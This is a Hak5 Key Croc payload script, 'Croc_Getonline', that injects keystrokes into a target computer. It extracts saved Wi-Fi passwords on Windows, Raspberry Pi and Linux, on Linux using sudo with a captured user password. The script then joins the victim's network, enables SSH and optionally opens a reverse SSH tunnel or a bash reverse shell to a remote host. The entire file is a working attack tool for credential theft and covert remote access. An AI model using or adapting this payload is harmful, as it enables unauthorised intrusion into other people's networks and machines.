# Title:           Croc_Getonline
# Description:     Attempt to connect Keycroc automatically to target wifi access point
#                  Save to tools/wifipass.txt and tools/old_wifipass.txt
# Author:          spywill
# Version:         4.0
# Category:        Key Croc
# Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro

MATCH (getonline_W|getonline_R|getonline_L|getonline_N|getonline_F|getonline_K|getonline_S|getonline_H)
QUACK LOCK

#---> Edit payload option below
option=0
keycroc_password=hak5croc
wifi_pass=/tools/wifipass.txt

#---> Edit remote host below
remote_user_name=EDIT_REMOTE_USERNAME_HERE
remote_host_ip=EDIT_REMOTE_HOST_IP_HERE
remote_host_password=EDIT_REMOTE_HOST_PASSWORD_HERE
port=7000

#---> Edit known SSID and password below
known_ssid=EDIT_KNOWN_SSID_HERE
known_ssid_password=EDIT_KNOWN_SSID_PASSWORD_HERE

#---> Edit Linux target password below
if [ -f ~/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then
	target_password=$(sed '$!d' ~/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
else
	target_password=ENTER_LINUX_PASSWORD_HERE
fi

ENTER_STORAGE() {
	if [ -f ~/udisk$wifi_pass ]; then
		cat ~/udisk$wifi_pass >> ~/udisk/tools/old_wifipass.txt
		rm -f ~/udisk$wifi_pass
	fi
	ATTACKMODE HID STORAGE
	QUACK DELAY 5000
	LED ATTACK
}

RESET_PAYLOAD() {
	QUACK UNLOCK
	sleep 5 ; LED OFF
	killall -9 bash
	killall -9 python
	sleep 1
	RELOAD_PAYLOADS
}

case $LOOT in
	getonline_W)
		ENTER_STORAGE
		QUACK GUI r
		QUACK DELAY 3000
		QUACK STRING "powershell -NoP -NonI -W Hidden"
		QUACK ENTER
		QUACK DELAY 5000
		QUACK STRING "\$MOUNT_POINT = Join-Path (Get-WmiObject -Class win32_volume -Filter 'label=\"KeyCroc\"').DriveLetter \"$wifi_pass\""
		QUACK ENTER
		QUACK DELAY 3000
		QUACK STRING "\$currentSSID = (netsh wlan show interfaces | Select-String \"SSID\")[0].ToString().Trim() -replace 'SSID\s+:\s+'"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "\$lastObject = (netsh wlan show profile name=\"\$currentSSID\" key=clear) | Select-String \"Key Content\W+:(.+)\$\" | ForEach-Object {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=\$currentSSID;PASSWORD=\$pass }} | Select-Object -Last 1"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "\"\$(\$lastObject.PROFILE_NAME) \$(\$lastObject.PASSWORD)\" | Out-File -Encoding UTF8 \"\$MOUNT_POINT\""
		QUACK ENTER
		QUACK DELAY 5000
		QUACK STRING "exit"
		QUACK ENTER
		ATTACKMODE HID
;;
	getonline_R)
		ENTER_STORAGE
		QUACK CONTROL-ALT-d
		QUACK CONTROL-ALT-t
		QUACK DELAY 2000
		QUACK STRING "MOUNT_POINT=/media/\$(whoami)/KeyCroc"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "currentSSID=\$(iw dev wlan0 info | grep ssid | awk '{print \$2}')"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "SSID_password=\$(sudo sed -e '/ssid\ psk/,+1p' -ne \":a;/\$currentSSID/{n;h;p;x;ba}\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\"\(.*\)\"/\1/')"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "echo \"\$currentSSID \$SSID_password\" | tee \$MOUNT_POINT$wifi_pass"
		QUACK ENTER
		QUACK DELAY 3000
		QUACK STRING "umount \$MOUNT_POINT ; exit"
		QUACK ENTER
		ATTACKMODE HID
;;
	getonline_L)
		ENTER_STORAGE
		QUACK CONTROL-ALT-d
		QUACK ALT-t
		QUACK DELAY 2000
		QUACK STRING "MOUNT_POINT=\"/mnt/usb\" ; sudo mkdir -p \$MOUNT_POINT ; sudo mount -L \"KeyCroc\" \$MOUNT_POINT"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "$target_password"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "currentSSID=\$(iw dev wlan0 info | grep ssid | awk '{print \$2}')"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "SSID_password=\$(sudo grep -r '^psk=' /etc/NetworkManager/system-connections/\$currentSSID* | sed -e 's/psk=//g')"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "echo \"\$currentSSID \$SSID_password\" | sudo tee \$MOUNT_POINT$wifi_pass"
		QUACK ENTER
		QUACK DELAY 3000
		QUACK STRING "sudo umount \$MOUNT_POINT ; exit"
		QUACK ENTER
		ATTACKMODE HID
;;
	getonline_N)
		LED B
		sleep 2
		echo "$known_ssid $known_ssid_password" > ~/udisk$wifi_pass
;;
	getonline_F)
		if [ -f ~/udisk$wifi_pass ]; then
			LED B
			sleep 2
		else
			LED R
			RESET_PAYLOAD
		fi
;;
	getonline_K)
		ifconfig wlan0 down
		LED R
		RESET_PAYLOAD
;;
	getonline_S)
		ATTACKMODE HID STORAGE
		RESET_PAYLOAD
;;
	getonline_H)
		ATTACKMODE HID
		RESET_PAYLOAD
;;
esac
sleep 3

word_count=$(head -n 1 "/root/udisk$wifi_pass" | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | wc -w)
if [[ $word_count -eq 2 ]]; then
	LED SETUP
else
	LED R
	RESET_PAYLOAD
fi

kill -9 $(pidof wpa_supplicant)
kill -9 $(pidof dhclient)
ifconfig wlan0 down

if [ "$LOOT" = "getonline_W" ]; then
	sed -i '0,/./s/^.//' ~/udisk$wifi_pass
	sed -i -e '1s/^[^[:print:]]*//' ~/udisk$wifi_pass
	sed -i 's/\r//g' ~/udisk$wifi_pass
fi

sed -i 's/\( \)*/\1/g' ~/udisk$wifi_pass
sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' ~/udisk/config.txt
sed -i -E -e '1{x;s#^#sed -n 1p '/root/udisk$wifi_pass'#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' root/udisk/config.txt
wpa_passphrase $(sed 's/ .*//' ~/udisk$wifi_pass) $(sed 's/.* //' ~/udisk$wifi_pass) > /etc/wpa_supplicant.conf

ifconfig wlan0 up
wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf
dhclient wlan0
sleep 3
systemctl restart ssh.service

if : >/dev/tcp/8.8.8.8/53; then
	if [ $option -eq 0 ]; then
		:
	elif [ $option -eq 1 ]; then
		case "$LOOT" in
			getonline_W)
				QUACK GUI m
				QUACK GUI r
				QUACK DELAY 2000
				QUACK STRING "powershell"
				QUACK ENTER
				QUACK DELAY 5000
		;;
			getonline_R)
				QUACK CONTROL-ALT-d
				QUACK CONTROL-ALT-t
				QUACK DELAY 2000
		;;
			getonline_L)
				QUACK CONTROL-ALT-d
				QUACK ALT-t
				QUACK DELAY 2000
		;;
		esac
		QUACK STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
		QUACK ENTER
		QUACK DELAY 2000
		QUACK STRING "$keycroc_password"
		QUACK ENTER
	elif [ $option -eq 2 ]; then
		if nmap -sn "$remote_host_ip" | grep -q "Host is up"; then
			cp -rp ~/.ssh ~/udisk/backup_ssh 2>/dev/null
			rm -rf ~/.ssh 2>/dev/null
			ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
			sshpass -p "$keycroc_password" ssh -o "StrictHostKeyChecking no" root@localhost "sshpass -p \"$remote_host_password\" ssh-copy-id -o \"StrictHostKeyChecking no\" -i ~/.ssh/id_rsa.pub $remote_user_name@$remote_host_ip"
			sleep 1
			ssh -o "StrictHostKeyChecking no" -fN -R $port:localhost:22 $remote_user_name@$remote_host_ip
		else
			LED R
		fi
	elif [ $option -eq 3 ]; then
		if nmap -sn "$remote_host_ip" | grep -q "Host is up"; then
			/bin/bash -i >& /dev/tcp/"$remote_host_ip"/"$port" 0>&1 &
		else
			LED R
		fi
	else
		LED FINISH
	fi
	LED FINISH
else
	LED R
fi

sleep 3
LED OFF
QUACK UNLOCK
